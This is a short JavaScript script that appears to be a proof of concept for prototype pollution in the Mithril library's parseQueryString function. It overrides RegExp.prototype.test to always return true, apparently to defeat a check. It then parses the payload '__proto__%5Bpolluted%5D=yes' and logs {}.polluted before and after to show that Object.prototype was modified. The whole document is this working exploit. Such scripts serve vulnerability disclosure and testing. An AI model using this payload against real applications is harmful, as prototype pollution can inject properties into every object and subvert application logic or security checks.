RegExp.prototype.test = () => true;
require('mithril/test-utils/browserMock')(global);
const m = require('mithril');
obj = {};
console.log({}.polluted);
m.parseQueryString('__proto__%5Bpolluted%5D=yes');
console.log({}.polluted);